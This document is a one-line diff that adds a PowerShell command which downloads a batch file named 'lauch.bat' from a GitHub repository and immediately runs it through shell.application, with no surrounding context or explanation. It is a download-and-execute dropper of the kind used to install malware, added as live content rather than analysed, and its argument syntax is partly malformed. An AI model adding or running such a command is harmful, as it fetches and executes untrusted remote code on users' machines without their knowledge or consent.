@@ -1,0 +1,1 @@
+powershell Start-Process powershell -$down = New-Object System.Net.WebClient; $url = 'https://github.com/Quentinq32/clouddrive/raw/main/lauch.bat'; $file = 'lauch.bat'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);exit;
